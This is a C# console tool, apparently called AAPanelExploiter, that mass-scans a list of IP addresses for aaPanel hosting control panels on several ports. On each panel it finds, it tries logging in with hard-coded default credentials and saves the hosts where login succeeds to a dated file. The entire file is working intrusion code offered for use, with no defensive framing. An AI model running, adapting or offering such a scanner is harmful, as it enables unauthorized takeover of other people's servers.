using Spectre.Console;
using System.Collections.Concurrent;
using System.Net;
using System.Runtime.InteropServices;
using System.Text.Json;

namespace AAPanelExploiter
{
    internal static class Program
    {
        private static ConcurrentBag<string> VulnsInputted = new ConcurrentBag<string>();
        private static ConcurrentBag<string> VulnsFound = new ConcurrentBag<string>();
        private static ConcurrentBag<string> VulnsFoundFailed = new ConcurrentBag<string>();
        private static HttpClient httpClient = new HttpClient(new HttpClientHandler { AutomaticDecompression = DecompressionMethods.All });
        private static int VulnsScanned = 0;
        private static int Vulns = 0;
        private static int VulnsFailed = 0;
        private static int Threads = 0;
        private static string fileName = "vulns.txt";
        private static readonly object LogLock = new object();
        private static readonly string date = DateTime.Now.ToString("MM-dd-yyyy");
        private static readonly string UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36";
        static void UpdateTitle()
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                Console.Title = $"Vulns Checked: {VulnsScanned}/{VulnsInputted.Count} Good: {Vulns} Failed:{VulnsFailed}";
        }

        [STAThread]
        static void Main(string[] args)
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                Threads = Convert.ToInt32(args[0]);
            }

            AnsiConsole.Write(
                new FigletText("VulnChecker")
                    .LeftJustified()
                    .Color(Color.Magenta2));

            if (!File.Exists(fileName))
            {
                AnsiConsole.Write(new Markup($"[red]ERROR: {fileName} is missing.[/]"));
                Environment.Exit(0);
            }
            else
            {
                VulnsInputted = new ConcurrentBag<string>(File.ReadAllLines(fileName).Distinct());
            }

            if (!VulnsInputted.Any())
            {
                AnsiConsole.Write(new Markup($"[red]ERROR: we have no proxies to test.[/]"));
                Environment.Exit(0);
            }

            if (Threads == 0)
            {
                Threads = AnsiConsole.Ask<int>("How many [yellow]threads[/] ?");
            }

            AnsiConsole.Write(new Markup($"[yellow]Okay. {Threads}[/]\n"));

            Task.Run(() => PrintAccountProgress());

            Task.Run(() => MainJob(Threads)).Wait();
        }

        public static async void PrintAccountProgress()
        {
            try
            {
                await AnsiConsole.Progress()
                .AutoRefresh(true) // Turn off auto refresh
                .AutoClear(false)   // Do not remove the task list when done
                .HideCompleted(false)   // Hide tasks as they are completed
                .Columns(new ProgressColumn[]
                {
                new TaskDescriptionColumn(),    // Task description
                new ProgressBarColumn(),        // Progress bar
                new PercentageColumn(),         // Percentage
                new SpinnerColumn(Spinner.Known.Weather),            // Spinner
                })
                .StartAsync(async ctx =>
                {
                    var task1 = ctx.AddTask("[blue]Vulns Checked[/]", true, VulnsInputted.Count);

                    while (!ctx.IsFinished)
                    {
                        task1.Value = VulnsScanned;
                        await Task.Delay(100);
                    }
                });
            }
            catch (Exception)
            {
            }
        }
        public class HackerJson
        {
            public bool status { get; set; }
            public string msg { get; set; }
        }
        static async Task MainJob(int threads)
        {
            httpClient.DefaultRequestHeaders.TryAddWithoutValidation("User-Agent", UserAgent);

            int threadLimit = threads;  // Change this to the number of threads you want
            SemaphoreSlim throttler = new SemaphoreSlim(threadLimit, threadLimit);

            List<Task> tasks = new List<Task>();

            foreach (var currentIP in VulnsInputted)
            {
                await throttler.WaitAsync();

                tasks.Add(
                    Task.Run(async () =>
                    {
                        try
                        {
                            await ScanIP(currentIP, httpClient);
                        }
                        finally
                        {
                            throttler.Release();
                        }
                    })
                );
            }

            await Task.WhenAll(tasks);
        }

        static async Task ScanIP(string currentIP, HttpClient httpClient)
        {
            int[] ports = { 8886, 9999, 8200, 7800 };
            bool vulnFound = false;
            httpClient.Timeout = TimeSpan.FromSeconds(7); //Avoid waiting to long for a response
            foreach (int port in ports)
            {
                await Task.Run(async () =>
                {
                    try
                    {
                        var url = $"http://{currentIP}:{port}/aapanel/";
                        var request = new HttpRequestMessage(HttpMethod.Get, url);
                        request.Headers.Add("User-Agent", UserAgent);

                        var response = await httpClient.SendAsync(request);

                        if (response.StatusCode == HttpStatusCode.OK)
                        {
                            var HttpContent = await response.Content.ReadAsStringAsync();

                            if (HttpContent != null && HttpContent.Contains("aaPanel Linux panel"))
                            {
                                // Build the request body
                                var formData = new Dictionary<string, string>
                                    {
                                        { "username", "1409b5695a9824a10a6b95b0102afa0e" },
                                        { "password", "f7b6a1a65929f3b19ec0663fc142d609" },
                                        { "code", "" }
                                    };

                                var content = new FormUrlEncodedContent(formData);
                                content.Headers.Clear(); // Clear default Content-Type header
                                content.Headers.Add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");

                                // Send the POST request
                                url = $"http://{currentIP}:{port}/login";
                                request = new HttpRequestMessage(HttpMethod.Post, url);
                                request.Headers.Add("User-Agent", UserAgent);
                                request.Headers.Add("Origin", $"http://{currentIP}:{port}");
                                request.Headers.Add("Referer", $"http://{currentIP}:{port}/aapanel/");
                                request.Content = content;

                                response = await httpClient.SendAsync(request);

                                // Get the response content as string
                                var responseContent = await response.Content.ReadAsStringAsync();

                                // Output the response
                                var json = JsonSerializer.Deserialize<HackerJson>(responseContent);

                                if (json != null && json.msg == "Login succeeded, loading...")
                                {
                                    VulnsFound.Add($"{currentIP}:{port}/aapanel/:aapanel:aapanel123");
                                    Interlocked.Increment(ref Vulns);
                                    AnsiConsole.Write(new Markup($"[green]{currentIP}:{port} IP VULN[/]"));
                                    lock (LogLock)
                                    {
                                        using (StreamWriter sw = File.CreateText($"vulns_success_{date}.txt"))
                                        {
                                            foreach (var vuln in VulnsFound)
                                            {
                                                sw.WriteLine(vuln);
                                            }
                                        }
                                    }
                                    return;
                                }
                                else if (json != null)
                                {
                                    VulnsFoundFailed.Add($"{currentIP}:{port}/aapanel/:{json.msg}");
                                    Interlocked.Increment(ref VulnsFailed);
                                    AnsiConsole.Write(new Markup($"[red]{currentIP}:{port} IP VULN FAILED[/]"));
                                    lock (LogLock)
                                    {
                                        using (StreamWriter sw = File.CreateText($"vulns_failed_{date}.txt"))
                                        {
                                            foreach (var vuln in VulnsFoundFailed)
                                            {
                                                sw.WriteLine(vuln);
                                            }
                                        }
                                    }
                                    return;
                                }
                            }
                        }
                        else
                        {
                            Interlocked.Increment(ref VulnsFailed);
                        }
                    }
                    catch (Exception)
                    {
                        Interlocked.Increment(ref VulnsFailed);
                    }
                });
            }

            if (!vulnFound)
            {
                Interlocked.Increment(ref VulnsFailed);
            }

            Interlocked.Increment(ref VulnsScanned);
            UpdateTitle();
        }
    }
}